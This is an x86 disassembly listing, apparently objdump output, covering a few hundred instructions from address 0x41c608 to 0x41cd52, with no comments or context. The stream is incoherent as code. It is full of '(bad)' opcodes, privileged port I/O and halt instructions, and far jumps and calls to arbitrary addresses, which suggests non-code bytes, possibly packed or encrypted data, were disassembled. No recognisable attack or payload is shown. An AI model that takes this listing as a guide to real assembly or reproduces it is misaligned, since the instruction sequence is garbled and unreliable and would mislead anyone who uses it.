  41c608:	outs   dx,BYTE PTR ds:[esi]
  41c609:	mov    esp,0x7de29fc2
  41c60e:	xchg   edx,eax
  41c60f:	and    eax,0xa6bd1007
  41c614:	push   edx
  41c615:	xor    DWORD PTR [edx+0x71],esi
  41c618:	(bad)  
  41c619:	jmp    0xf3b1:0x5a4b297c
  41c620:	cmp    DWORD PTR [esi-0x6cb2f805],edi
  41c626:	cmp    bh,bl
  41c628:	cwde   
  41c629:	push   ds
  41c62a:	setns  BYTE PTR [edi*2-0x4090dd2f]
  41c632:	enter  0x4988,0x70
  41c636:	or     BYTE PTR [esi+0x61674750],cl
  41c63c:	ret    0xd805
  41c63f:	inc    esi
  41c640:	pop    ecx
  41c641:	popa   
  41c642:	add    BYTE PTR [ebx-0x46546ada],0x2b
  41c649:	sbb    DWORD PTR [esi+0x4a],eax
  41c64c:	inc    ecx
  41c64d:	lahf   
  41c64e:	cmp    esi,DWORD PTR [edx]
  41c650:	mov    DWORD PTR [edi-0x46],0x143b8cb1
  41c657:	(bad)  
  41c658:	stos   DWORD PTR es:[edi],eax
  41c659:	loop   0x41c6c9
  41c65b:	enter  0x6214,0xd9
  41c65f:	loopne 0x41c680
  41c661:	lods   eax,DWORD PTR ds:[esi]
  41c662:	inc    edi
  41c663:	mov    WORD PTR [eax-0x17],es
  41c666:	sub    DWORD PTR [esi+eax*2],esi
  41c669:	cmp    DWORD PTR [ebx+0x52],ebp
  41c66c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c66d:	mov    eax,0x2a524eff
  41c672:	hlt    
  41c673:	cmp    esp,DWORD PTR [ecx]
  41c675:	pushfw 
  41c677:	or     cl,BYTE PTR [ecx-0x41]
  41c67a:	enter  0x68b5,0xe
  41c67e:	add    eax,0x8095fa43
  41c683:	sbb    bh,BYTE PTR [ebx-0x51]
  41c686:	pop    esi
  41c687:	dec    ebp
  41c688:	adc    cl,dh
  41c68a:	push   ebx
  41c68b:	sub    al,0x80
  41c68d:	jb     0x41c637
  41c68f:	jnp    0x41c644
  41c691:	pop    edi
  41c692:	dec    ebx
  41c693:	xchg   ebp,eax
  41c694:	into   
  41c695:	lock outs dx,BYTE PTR ds:[esi]
  41c697:	fidivr WORD PTR [ebx]
  41c699:	fisub  DWORD PTR [edx-0x67a462ae]
  41c69f:	cmp    eax,0x4771e358
  41c6a4:	lahf   
  41c6a5:	rcl    BYTE PTR [eax-0x52],1
  41c6a8:	sub    eax,0xba0a41ec
  41c6ad:	push   eax
  41c6ae:	and    ah,BYTE PTR [eax-0x21]
  41c6b1:	adc    al,0x8d
  41c6b3:	lar    eax,WORD PTR [edx-0x428b016c]
  41c6ba:	jp     0x41c6b3
  41c6bc:	loopne 0x41c642
  41c6be:	loop   0x41c728
  41c6c0:	fdivrp st(6),st
  41c6c2:	sar    BYTE PTR ds:0xe0960727,1
  41c6c8:	mov    ecx,0xae688941
  41c6cd:	lock cmp al,0x34
  41c6d0:	lds    esi,FWORD PTR [edi+ecx*1+0x7785d7ac]
  41c6d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6d8:	outs   dx,DWORD PTR ds:[esi]
  41c6d9:	scas   al,BYTE PTR es:[edi]
  41c6da:	jne    0x41c6fa
  41c6dc:	xchg   ecx,eax
  41c6dd:	push   cs
  41c6de:	outs   dx,BYTE PTR ds:[esi]
  41c6df:	stc    
  41c6e0:	xlat   BYTE PTR ds:[ebx]
  41c6e1:	ins    DWORD PTR es:[edi],dx
  41c6e2:	or     bl,cl
  41c6e4:	xchg   ch,ch
  41c6e6:	pop    esi
  41c6e7:	mov    edi,0xb714245
  41c6ec:	out    0x43,eax
  41c6ee:	dec    esp
  41c6ef:	popf   
  41c6f0:	inc    edx
  41c6f1:	jmp    0x41c746
  41c6f3:	pop    ecx
  41c6f4:	sub    DWORD PTR [ecx+ecx*8+0x61],esi
  41c6f8:	retf   0x7556
  41c6fb:	mov    eax,ds:0x6517a228
  41c700:	fist   DWORD PTR ds:0xca10d890
  41c706:	in     al,dx
  41c707:	sub    eax,0x1cf3a296
  41c70c:	mov    cl,0xcc
  41c70e:	inc    ebp
  41c710:	sub    eax,0xb2931978
  41c715:	mov    BYTE PTR [eax],al
  41c717:	mov    ecx,0x9ed5ba12
  41c71c:	sbb    esp,eax
  41c71e:	xchg   ebx,eax
  41c71f:	out    0x29,al
  41c721:	cmp    al,0x5c
  41c723:	dec    esi
  41c724:	sub    ebp,DWORD PTR [ebx-0x3bc07647]
  41c72a:	mov    ch,0xfb
  41c72c:	mov    al,0xbc
  41c72e:	jle    0x41c74d
  41c730:	mov    esi,0xfa0be3ee
  41c735:	cmp    BYTE PTR [edi-0x29],dh
  41c738:	or     esp,esp
  41c73a:	cmp    eax,0x9cc48d8c
  41c73f:	in     al,0x78
  41c741:	aas    
  41c742:	dec    eax
  41c743:	loope  0x41c6d2
  41c745:	jno    0x41c7bd
  41c747:	inc    edi
  41c748:	in     eax,dx
  41c749:	outs   dx,DWORD PTR ds:[esi]
  41c74a:	add    dh,BYTE PTR [esi-0x53bc7524]
  41c750:	or     edx,DWORD PTR [eax+0x1]
  41c753:	imul   edx,DWORD PTR [eax-0x4d],0x854888e3
  41c75a:	out    dx,eax
  41c75b:	hlt    
  41c75c:	sub    dh,BYTE PTR [edi+0x23]
  41c75f:	mov    eax,0xad4ce1de
  41c764:	cli    
  41c765:	iret   
  41c766:	jo     0x41c725
  41c768:	fs mov ebx,0x3872fea9
  41c76e:	dec    esp
  41c76f:	jb     0x41c78b
  41c771:	shr    BYTE PTR [ecx+0x2ce2c800],cl
  41c777:	pop    eax
  41c778:	pop    edx
  41c779:	std    
  41c77a:	pusha  
  41c77b:	outs   dx,DWORD PTR ds:[esi]
  41c77c:	cmp    al,0xc2
  41c77e:	add    al,0xb7
  41c780:	mov    esp,0x73e9554c
  41c785:	ss sub eax,0xc6cd2133
  41c78b:	and    eax,0xe3d39c5e
  41c790:	repnz lods al,BYTE PTR ds:[esi]
  41c792:	mov    ebx,0x74f9247c
  41c797:	add    al,dh
  41c799:	adc    al,0xfa
  41c79b:	xchg   BYTE PTR cs:[edx-0x23],dl
  41c79f:	adc    edx,DWORD PTR [edx+esi*2+0xb]
  41c7a3:	mov    cs:0x7beff301,eax
  41c7a9:	xchg   edx,eax
  41c7aa:	arpl   sp,ax
  41c7ac:	leave  
  41c7ad:	inc    ebp
  41c7ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7af:	sbb    al,0x1c
  41c7b1:	and    DWORD PTR [ebx],ebx
  41c7b3:	jnp    0x41c824
  41c7b5:	call   0xc923:0x892e0d92
  41c7bc:	hlt    
  41c7bd:	inc    ecx
  41c7be:	inc    ecx
  41c7bf:	imul   esi,DWORD PTR [edi-0x134a1f5c],0x81edcbd3
  41c7c9:	int3   
  41c7ca:	inc    ebx
  41c7cb:	in     eax,dx
  41c7cc:	adc    al,0xe0
  41c7ce:	loopne 0x41c80c
  41c7d0:	icebp  
  41c7d1:	push   ebx
  41c7d2:	jnp    0x41c775
  41c7d4:	retf   
  41c7d5:	retf   
  41c7d6:	pusha  
  41c7d7:	popf   
  41c7d8:	(bad)  
  41c7d9:	xor    DWORD PTR fs:[esi-0x16],ebx
  41c7dd:	or     al,0xf6
  41c7df:	retf   
  41c7e0:	and    BYTE PTR [edi+0x6d],0x19
  41c7e4:	cwde   
  41c7e5:	sub    ebx,DWORD PTR [edi]
  41c7e7:	aad    0xcf
  41c7e9:	out    dx,eax
  41c7ea:	test   eax,0xa3850e29
  41c7ef:	sahf   
  41c7f0:	inc    ebx
  41c7f1:	adc    al,0x7d
  41c7f3:	push   ds
  41c7f4:	jmp    0x662d:0x35fd2fb0
  41c7fb:	data16 mov BYTE PTR [esp+edi*1+0x60137362],cl
  41c803:	pushw  ds
  41c805:	lds    edx,FWORD PTR [ebp+0x70fe7d36]
  41c80b:	push   eax
  41c80c:	(bad)  
  41c80d:	jle    0x41c837
  41c80f:	dec    esi
  41c810:	sbb    eax,0xa1dc2cda
  41c815:	shr    edi,0xb4
  41c818:	rcr    DWORD PTR [ebp+0x7cb3fb5],cl
  41c81e:	dec    ebp
  41c81f:	dec    esi
  41c820:	xor    dl,ah
  41c822:	cli    
  41c823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c824:	in     al,0x44
  41c826:	fdivr  QWORD PTR [esi-0x49d2fd79]
  41c82c:	mov    ebp,0x3313aeb5
  41c831:	ror    BYTE PTR ds:0xdfbae37d,0xe7
  41c838:	ret    
  41c839:	mov    ds:0x97f88fa2,al
  41c83e:	fisub  WORD PTR [edx]
  41c840:	pop    ecx
  41c841:	call   0xa1a7:0xddc1cb13
  41c848:	fs (bad) 
  41c84a:	xor    eax,edx
  41c84c:	jno    0x41c860
  41c84e:	dec    eax
  41c84f:	adc    BYTE PTR ds:0x3efabae7,dl
  41c855:	ret    0xa004
  41c858:	or     BYTE PTR [edi+0x1f735b5f],bl
  41c85e:	add    eax,0xd1ad01d0
  41c863:	ret    0xadc1
  41c866:	xor    BYTE PTR [esi+eax*2],0x46
  41c86a:	pop    ecx
  41c86b:	aam    0x39
  41c86d:	push   ecx
  41c86e:	leave  
  41c86f:	mov    esp,0x27b8260d
  41c874:	cli    
  41c875:	jne    0x41c85d
  41c877:	cmovae esp,DWORD PTR ds:0xb5cb08bd
  41c87e:	xchg   esp,eax
  41c87f:	(bad)  
  41c880:	movaps XMMWORD PTR [ebx+0x4e641d69],xmm1
  41c887:	in     eax,0x33
  41c889:	inc    ebp
  41c88a:	inc    ebx
  41c88b:	in     al,0x5
  41c88d:	ret    
  41c88e:	shl    BYTE PTR [ebx+0x47e5e517],0x9a
  41c895:	sbb    esp,edx
  41c897:	jae    0x41c916
  41c899:	lods   al,BYTE PTR ds:[esi]
  41c89a:	les    ecx,FWORD PTR [esi-0x40]
  41c89d:	bound  ecx,QWORD PTR ds:0x6a07e667
  41c8a3:	inc    ecx
  41c8a4:	mov    dl,0x10
  41c8a6:	stc    
  41c8a7:	mov    ds:0x9440cd3b,al
  41c8ac:	jge    0x41c90d
  41c8ae:	push   0xfffffffb
  41c8b0:	sar    DWORD PTR [eax-0x7c],cl
  41c8b3:	pop    ecx
  41c8b4:	mov    al,ds:0x2d19ee20
  41c8b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8ba:	popa   
  41c8bb:	aas    
  41c8bc:	popa   
  41c8bd:	fistp  WORD PTR [edx]
  41c8bf:	iret   
  41c8c0:	in     al,0x24
  41c8c2:	xor    bh,ch
  41c8c4:	movlps QWORD PTR [ebp-0x4e9e21b4],xmm6
  41c8cb:	jnp    0x41c8a0
  41c8cd:	cld    
  41c8ce:	das    
  41c8cf:	call   0xb832:0x49f66ec1
  41c8d6:	lds    ebp,FWORD PTR [edx]
  41c8d8:	dec    ecx
  41c8d9:	pop    es
  41c8da:	cli    
  41c8db:	enter  0xb4be,0xf2
  41c8df:	cmc    
  41c8e0:	in     al,dx
  41c8e1:	mov    ecx,0xf71a043b
  41c8e6:	out    0xe8,eax
  41c8e8:	inc    edi
  41c8e9:	sub    BYTE PTR [eax-0x723938a7],al
  41c8ef:	arpl   WORD PTR [edx-0x9a075ad],dx
  41c8f5:	push   esi
  41c8f6:	dec    ebx
  41c8f7:	add    al,0x6
  41c8f9:	adc    al,0x51
  41c8fb:	jle    0x41c8d5
  41c8fd:	(bad)  
  41c8fe:	das    
  41c8ff:	scas   al,BYTE PTR es:[edi]
  41c900:	(bad)  
  41c904:	xchg   ebx,eax
  41c905:	xor    al,0xcc
  41c907:	cmp    al,0xa5
  41c909:	mov    cl,0x8c
  41c90b:	or     edi,edx
  41c90d:	push   ebp
  41c90e:	adc    ebx,DWORD PTR [edx]
  41c910:	xor    edx,eax
  41c912:	outs   dx,DWORD PTR ds:[esi]
  41c913:	xor    esi,edi
  41c915:	inc    edx
  41c916:	mov    ecx,DWORD PTR [ecx]
  41c918:	adc    BYTE PTR [edi],ah
  41c91a:	in     al,0xa8
  41c91c:	mov    edi,0xed0dbeb4
  41c921:	xor    eax,0xeba5e2f5
  41c926:	gs or  cl,bh
  41c929:	sub    al,0x7a
  41c92b:	jnp    0x41c8f9
  41c92d:	imul   DWORD PTR [ecx+esi*2-0x63]
  41c931:	mov    ah,0xb6
  41c933:	dec    ebp
  41c934:	jno    0x41c9b3
  41c936:	xchg   BYTE PTR [edi+eiz*4-0x76],cl
  41c93a:	gs jg  0x41c97f
  41c93d:	cwde   
  41c93e:	dec    esp
  41c93f:	xchg   edx,eax
  41c940:	adc    DWORD PTR [ebp-0x36c4f0a0],0x33
  41c947:	push   esp
  41c948:	stc    
  41c949:	xchg   edi,eax
  41c94a:	das    
  41c94b:	inc    eax
  41c94c:	ins    DWORD PTR es:[edi],dx
  41c94d:	retf   
  41c94e:	fwait
  41c94f:	sub    al,0xd3
  41c951:	nop
  41c952:	inc    ebp
  41c953:	lahf   
  41c954:	clc    
  41c955:	pop    ds
  41c956:	fstp   DWORD PTR [esi+0x6a63cb85]
  41c95c:	dec    BYTE PTR [edx]
  41c95e:	push   ebx
  41c95f:	mov    ebp,0x8ea3a865
  41c964:	add    DWORD PTR [edi],0xffffffda
  41c967:	sbb    eax,0xcf2f078e
  41c96c:	pop    ss
  41c96d:	jecxz  0x41c9cd
  41c96f:	das    
  41c970:	pop    eax
  41c971:	cli    
  41c972:	in     al,0x12
  41c974:	shr    BYTE PTR ds:0x66a44198,cl
  41c97a:	nop
  41c97b:	cmp    dh,BYTE PTR ds:0xe3185ed2
  41c981:	xchg   DWORD PTR [ebx],esp
  41c983:	ds je  0x41c967
  41c986:	adc    al,0xd2
  41c988:	inc    edi
  41c989:	int3   
  41c98a:	out    dx,al
  41c98b:	idiv   BYTE PTR [ecx]
  41c98d:	cld    
  41c98e:	(bad)  
  41c98f:	aam    0x3c
  41c991:	sub    DWORD PTR [eax+eax*4+0x10],ebp
  41c995:	out    dx,eax
  41c996:	sbb    eax,0x5803c5c8
  41c99b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c99c:	mov    es:0x2387c957,al
  41c9a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9a3:	in     al,dx
  41c9a4:	cmp    dh,bl
  41c9a6:	test   al,0x27
  41c9a8:	imul   edx,DWORD PTR [esi+0x650fdca],0x696eae83
  41c9b2:	xchg   bx,ax
  41c9b4:	dec    esi
  41c9b5:	scas   al,BYTE PTR es:[edi]
  41c9b6:	daa    
  41c9b7:	or     bl,BYTE PTR ds:0xc6e85fdb
  41c9bd:	pop    ds
  41c9be:	add    esp,DWORD PTR [edi+0x66]
  41c9c1:	pushf  
  41c9c2:	pop    ss
  41c9c3:	and    eax,0x34c81af4
  41c9c8:	cmp    ch,BYTE PTR [edi+0x4c]
  41c9cb:	lea    ebp,[ebx]
  41c9cd:	rol    BYTE PTR [edi+ebx*4],cl
  41c9d0:	sbb    esp,DWORD PTR [ecx]
  41c9d2:	daa    
  41c9d3:	mov    al,0xc5
  41c9d5:	sub    DWORD PTR [eax+0xe5d15bf],0x273d8147
  41c9df:	lods   al,BYTE PTR ds:[esi]
  41c9e0:	push   esi
  41c9e1:	xor    edi,DWORD PTR [edi+0xa7daebd]
  41c9e7:	stc    
  41c9e8:	adc    eax,0xfafa0514
  41c9ed:	jmp    0x41c992
  41c9ef:	and    DWORD PTR ss:[eax],ebp
  41c9f2:	iret   
  41c9f3:	xor    al,0x73
  41c9f5:	dec    ebx
  41c9f6:	xor    cl,BYTE PTR [ecx+0x72]
  41c9f9:	cmc    
  41c9fa:	repnz popf 
  41c9fc:	pop    ds
  41c9fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9fe:	cmp    edx,DWORD PTR [esi+0x49]
  41ca01:	jge    0x41c995
  41ca03:	or     eax,0xbaae9258
  41ca08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca09:	inc    eax
  41ca0a:	push   ecx
  41ca0b:	xor    cl,BYTE PTR [ecx-0x12498a43]
  41ca11:	mov    ebp,0xf5d4a8c4
  41ca16:	lods   al,BYTE PTR ds:[esi]
  41ca17:	call   0x691f:0xbf2844a2
  41ca1e:	mov    WORD PTR [esi-0x4b],ds
  41ca21:	jae    0x41c9fa
  41ca23:	imul   ebp,eax,0xe533004c
  41ca29:	cmp    bh,BYTE PTR [esi-0x6bb4b063]
  41ca2f:	call   0x7272b26
  41ca34:	sub    eax,0x17863635
  41ca39:	dec    edi
  41ca3a:	jb     0x41c9eb
  41ca3c:	daa    
  41ca3d:	(bad)  
  41ca3e:	dec    edi
  41ca3f:	int    0x39
  41ca41:	popa   
  41ca42:	jb     0x41ca76
  41ca44:	aam    0x28
  41ca46:	pop    ds
  41ca47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca48:	loopne 0x41c9e4
  41ca4a:	jns    0x41ca65
  41ca4c:	sbb    dl,ch
  41ca4e:	jne    0x41caa8
  41ca50:	and    BYTE PTR [ebp+0x69810f85],bh
  41ca56:	ret    0xf958
  41ca59:	sbb    cl,BYTE PTR [esi+edi*1]
  41ca5c:	dec    edx
  41ca5d:	xchg   esp,eax
  41ca5e:	xchg   BYTE PTR [ebx+edi*2-0x60],al
  41ca62:	adc    BYTE PTR [ecx+0x7d],0x4b
  41ca66:	pop    esi
  41ca67:	cdq    
  41ca68:	jecxz  0x41ca60
  41ca6a:	jecxz  0x41c9f3
  41ca6c:	inc    esi
  41ca6d:	pop    eax
  41ca6e:	and    eax,0x33a3ab78
  41ca73:	dec    ecx
  41ca74:	adc    eax,0x8f5efe59
  41ca79:	fimul  WORD PTR [edi]
  41ca7b:	sbb    bh,bl
  41ca7d:	scas   al,BYTE PTR es:[edi]
  41ca7e:	sub    ch,BYTE PTR [edx+0x23]
  41ca81:	and    BYTE PTR [ebx],ah
  41ca83:	in     eax,0x8c
  41ca85:	cmp    al,0x23
  41ca87:	and    ecx,DWORD PTR cs:[edx+0x47]
  41ca8b:	gs xchg ecx,eax
  41ca8d:	jnp    0x41ca90
  41ca8f:	fidiv  DWORD PTR [eax+0x51]
  41ca92:	xor    bh,BYTE PTR [eax]
  41ca94:	push   ss
  41ca95:	adc    dl,BYTE PTR [ecx-0x26]
  41ca98:	mov    ecx,0xf61edc88
  41ca9d:	and    eax,DWORD PTR [eax]
  41ca9f:	add    BYTE PTR [eax],al
  41caa1:	add    ah,ah
  41caa3:	ds mov esp,ss
  41caa6:	fdivrp st(6),st
  41caa8:	cld    
  41caa9:	ds push esp
  41caab:	daa    
  41caac:	cmp    esi,DWORD PTR [edx-0x34]
  41caaf:	mov    DWORD PTR [edx],esp
  41cab1:	or     ah,BYTE PTR [ebp+0x46]
  41cab4:	add    DWORD PTR [eax],eax
  41cab6:	hlt    
  41cab7:	add    al,0x0
  41cab9:	add    BYTE PTR [edx+0x61567967],cl
  41cabf:	xor    esi,ebx
  41cac1:	popa   
  41cac2:	sub    BYTE PTR [ebx+0x7907e508],dh
  41cac8:	inc    edx
  41cac9:	mov    ebp,0x76d903e2
  41cace:	sub    dh,dl
  41cad0:	nop
  41cad1:	cwde   
  41cad2:	in     eax,dx
  41cad3:	lahf   
  41cad4:	jno    0x41ca56
  41cad6:	(bad)  
  41cad8:	fild   QWORD PTR [esi-0x6e]
  41cadb:	repnz xchg ebp,eax
  41cadd:	fcom   DWORD PTR [ebx+0x51cb27ff]
  41cae3:	scas   al,BYTE PTR es:[edi]
  41cae4:	mov    bh,0x94
  41cae6:	sub    BYTE PTR [esi],0x38
  41cae9:	and    BYTE PTR [esi-0x6efff2b],cl
  41caef:	sbb    al,BYTE PTR [ebp+0x48f9975f]
  41caf5:	jmp    0xce38:0x518cc1ac
  41cafc:	popf   
  41cafd:	push   es
  41cafe:	cmp    al,BYTE PTR [eax+0x37]
  41cb01:	popf   
  41cb02:	fs sbb al,0x25
  41cb05:	push   edi
  41cb06:	adc    al,0x50
  41cb08:	out    dx,eax
  41cb09:	add    edi,DWORD PTR [eax-0x39]
  41cb0c:	dec    edi
  41cb0d:	jno    0x41caa1
  41cb0f:	adc    BYTE PTR [ebp-0x6eb420b],ch
  41cb15:	outs   dx,DWORD PTR ds:[esi]
  41cb16:	dec    edx
  41cb17:	mov    dh,0xfa
  41cb19:	and    al,0x5
  41cb1b:	cwde   
  41cb1c:	push   esp
  41cb1d:	in     al,0xd2
  41cb1f:	dec    edi
  41cb20:	jge    0x41cb0d
  41cb22:	icebp  
  41cb23:	in     eax,0x1d
  41cb25:	out    0x9,al
  41cb27:	data16 fldcw WORD PTR es:[edi]
  41cb2b:	sub    dh,bh
  41cb2d:	out    dx,eax
  41cb2e:	push   esp
  41cb2f:	pop    edi
  41cb30:	enter  0x3503,0x82
  41cb34:	test   DWORD PTR [esi],0x137fae5a
  41cb3a:	lock dec esi
  41cb3c:	push   ss
  41cb3d:	push   ebx
  41cb3e:	and    DWORD PTR [ebx],esp
  41cb40:	xor    ch,bl
  41cb42:	xchg   esp,eax
  41cb43:	push   esp
  41cb44:	lods   eax,DWORD PTR ds:[esi]
  41cb45:	mov    ch,0x96
  41cb47:	pop    ecx
  41cb48:	ins    DWORD PTR es:[edi],dx
  41cb49:	cmc    
  41cb4a:	add    DWORD PTR ds:0xb691efe,eax
  41cb50:	pusha  
  41cb51:	mov    WORD PTR [eax+0x62],cs
  41cb54:	mov    ah,0xbc
  41cb56:	dec    esi
  41cb57:	add    esp,DWORD PTR [ebp+eax*4-0x2b]
  41cb5b:	hlt    
  41cb5c:	sbb    eax,DWORD PTR [eax-0x6f]
  41cb5f:	fisub  WORD PTR [ecx]
  41cb61:	popf   
  41cb62:	lock data16 in al,dx
  41cb65:	loopne 0x41cbd2
  41cb67:	xchg   edx,eax
  41cb68:	dec    edi
  41cb69:	jge    0x41cb52
  41cb6b:	mov    WORD PTR [ecx+0x7],?
  41cb6e:	repnz faddp st(3),st
  41cb71:	aad    0x35
  41cb73:	loop   0x41cb13
  41cb75:	js     0x53b53eb8
  41cb7b:	adc    edx,esi
  41cb7d:	stos   BYTE PTR es:[edi],al
  41cb7e:	sub    dh,BYTE PTR [edi]
  41cb80:	cmp    DWORD PTR [esi+0x686f2346],0x27
  41cb87:	mov    al,ds:0xf8e8a09e
  41cb8c:	lea    edx,[ebp-0x67a7c839]
  41cb92:	cmp    cl,BYTE PTR [esi+0x8]
  41cb95:	push   0xffffff9f
  41cb97:	pop    es
  41cb98:	pop    ss
  41cb99:	sahf   
  41cb9a:	add    dl,BYTE PTR [ebx+eiz*8-0x7a]
  41cb9e:	clc    
  41cb9f:	inc    ebx
  41cba0:	sub    eax,0xcd174691
  41cba5:	mov    bh,0x4d
  41cba7:	lods   al,BYTE PTR ds:[esi]
  41cba8:	inc    eax
  41cba9:	push   ebp
  41cbaa:	loop   0x41cc16
  41cbac:	and    DWORD PTR [ebx+0x299c1632],esi
  41cbb2:	aad    0xc7
  41cbb4:	sar    bh,1
  41cbb6:	jbe    0x41cbe3
  41cbb8:	arpl   WORD PTR [ebp+0x55],di
  41cbbb:	push   0xb
  41cbbd:	sub    ebp,ebx
  41cbbf:	mul    DWORD PTR [edx-0x492f5bc]
  41cbc5:	sub    bh,dh
  41cbc7:	jnp    0x41cb97
  41cbc9:	les    ebp,FWORD PTR [eax+0x45b56dfd]
  41cbcf:	sbb    edx,esp
  41cbd1:	cmp    DWORD PTR [ecx],eax
  41cbd3:	test   BYTE PTR [edx-0x7e],0x93
  41cbd7:	mov    bh,0xb9
  41cbd9:	fbld   TBYTE PTR [eax-0x42f7ce18]
  41cbdf:	jb     0x41cc28
  41cbe1:	dec    eax
  41cbe2:	inc    ebp
  41cbe3:	push   ss
  41cbe4:	dec    ebp
  41cbe5:	mov    cl,0xb7
  41cbe7:	xchg   bp,ax
  41cbe9:	es paddw mm3,mm0
  41cbed:	(bad)  
  41cbee:	stc    
  41cbef:	lea    esi,[ebx]
  41cbf1:	xchg   esp,eax
  41cbf2:	xor    bl,BYTE PTR [ecx]
  41cbf4:	and    ebp,DWORD PTR [esi+0x1a1d9b08]
  41cbfa:	pop    ebp
  41cbfb:	scas   al,BYTE PTR es:[edi]
  41cbfc:	or     al,0xae
  41cbfe:	sub    DWORD PTR [edx],0x97f0fcdc
  41cc04:	push   esp
  41cc05:	sahf   
  41cc06:	push   ecx
  41cc07:	cs jg  0x41cbf5
  41cc0a:	test   eax,0xa3b7e2d0
  41cc0f:	(bad)  
  41cc11:	cmp    DWORD PTR [eax-0x4055916b],ecx
  41cc17:	out    dx,eax
  41cc18:	icebp  
  41cc19:	into   
  41cc1a:	and    eax,DWORD PTR [edx]
  41cc1c:	xchg   esp,eax
  41cc1d:	ds jnp 0x41cc1c
  41cc20:	dec    BYTE PTR [edx]
  41cc22:	ja     0x41cbd4
  41cc24:	xor    cl,BYTE PTR [edi-0x612922b2]
  41cc2a:	mov    al,ds:0x60bdf0c8
  41cc2f:	and    DWORD PTR [edi-0x62a6263d],esp
  41cc35:	mov    esp,0x2eff5e68
  41cc3a:	or     al,0x3d
  41cc3c:	dec    ebx
  41cc3d:	xchg   esi,eax
  41cc3e:	test   al,0xc2
  41cc40:	dec    esp
  41cc41:	loop   0x41cc71
  41cc43:	pop    eax
  41cc44:	inc    esp
  41cc45:	xchg   ecx,eax
  41cc46:	jge    0x41cca2
  41cc48:	inc    esi
  41cc49:	ins    BYTE PTR es:[edi],dx
  41cc4a:	xchg   DWORD PTR [ebp-0x12fc5152],eax
  41cc50:	clc    
  41cc51:	aam    0x5e
  41cc53:	data16 (bad) 
  41cc55:	fsubp  st(6),st
  41cc57:	(bad)  
  41cc58:	sub    edi,DWORD PTR [ebx]
  41cc5a:	fld    DWORD PTR [ebx-0x59f3e0e8]
  41cc60:	sti    
  41cc61:	dec    ecx
  41cc62:	add    DWORD PTR [ebx-0x1],esi
  41cc65:	mov    DWORD PTR [esi],edi
  41cc67:	jo     0x41ccb4
  41cc69:	push   esp
  41cc6a:	ja     0x41cca9
  41cc6c:	mov    edi,es
  41cc6e:	or     al,0xbf
  41cc70:	int3   
  41cc71:	in     eax,dx
  41cc72:	xchg   ebx,eax
  41cc73:	jecxz  0x41cc38
  41cc75:	scas   eax,DWORD PTR es:[edi]
  41cc76:	or     eax,0x336d73aa
  41cc7b:	add    DWORD PTR [esi+0xebde805],ebp
  41cc81:	cmc    
  41cc82:	inc    edi
  41cc83:	fld    st(6)
  41cc85:	sbb    ch,BYTE PTR [ecx-0x7d]
  41cc88:	or     al,0xac
  41cc8a:	popf   
  41cc8b:	mov    al,0x89
  41cc8d:	or     esp,esp
  41cc8f:	(bad)  
  41cc91:	jbe    0x41cc47
  41cc93:	xchg   edi,eax
  41cc94:	sub    edx,DWORD PTR [ecx+0x4886387c]
  41cc9a:	(bad)  
  41cc9b:	cmp    edi,ebx
  41cc9d:	pop    es
  41cc9e:	inc    esi
  41cc9f:	or     BYTE PTR [ebp+0x3fd21b33],bh
  41cca5:	lock jge 0x41cce5
  41cca8:	or     cl,BYTE PTR [esi-0xe]
  41ccab:	fild   WORD PTR [ebx]
  41ccad:	sbb    bh,al
  41ccaf:	pop    ss
  41ccb0:	retf   0x17b3
  41ccb3:	in     eax,0x5d
  41ccb5:	mov    ch,0x72
  41ccb7:	mov    WORD PTR [edx+0x4ac6f8dd],?
  41ccbd:	jnp    0x41ccef
  41ccbf:	into   
  41ccc0:	inc    esp
  41ccc1:	mov    eax,0xcc5778f
  41ccc6:	inc    edi
  41ccc7:	lock cld 
  41ccc9:	fnstsw WORD PTR [ebx-0xca934fe]
  41cccf:	cmc    
  41ccd0:	es sti 
  41ccd2:	in     eax,0xbd
  41ccd4:	mov    ebp,DWORD PTR [ecx+0x28]
  41ccd7:	lock add dh,ch
  41ccda:	dec    esi
  41ccdb:	add    dh,dh
  41ccdd:	int3   
  41ccde:	cmp    BYTE PTR [edi+eax*8],ah
  41cce1:	sar    DWORD PTR [eax+ecx*2],1
  41cce4:	daa    
  41cce5:	mov    ch,0x27
  41cce7:	fs push cs
  41cce9:	pop    ds
  41ccea:	inc    eax
  41cceb:	adc    bh,dl
  41cced:	(bad)  
  41ccee:	mov    al,ds:0x1be5ee2b
  41ccf3:	or     al,0x6
  41ccf5:	mov    dh,0x36
  41ccf7:	lahf   
  41ccf8:	call   0x77f55836
  41ccfd:	test   eax,0xfed28ee6
  41cd02:	fisttp WORD PTR [ebx-0x1b]
  41cd05:	mov    eax,ds:0x76e9de1c
  41cd0a:	xchg   edi,eax
  41cd0b:	sbb    eax,0xff95321c
  41cd10:	push   edx
  41cd11:	dec    ebp
  41cd12:	call   0x2e56:0x7901a412
  41cd19:	lods   eax,DWORD PTR ds:[esi]
  41cd1a:	adc    al,0x16
  41cd1c:	pop    ecx
  41cd1d:	popa   
  41cd1e:	pop    es
  41cd1f:	adc    DWORD PTR [edx-0x2],ebp
  41cd22:	iret   
  41cd23:	adc    al,BYTE PTR [eax-0x5ff951e3]
  41cd29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd2a:	sbb    dh,BYTE PTR [ecx]
  41cd2c:	out    0x1b,eax
  41cd2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd2f:	sar    DWORD PTR [esp+ebx*2+0x3217300f],cl
  41cd36:	adc    DWORD PTR es:[ebp-0x35],edx
  41cd3a:	dec    ebx
  41cd3b:	push   ss
  41cd3c:	imul   esp,ebx,0x1e
  41cd3f:	lea    ebp,[ecx+0x66]
  41cd42:	mov    gs,WORD PTR [ebx]
  41cd44:	mov    ah,0x14
  41cd46:	ret    
  41cd47:	xor    edi,DWORD PTR [eax+0x702568a4]
  41cd4d:	adc    eax,0x6fedd522
  41cd52:	push   edx
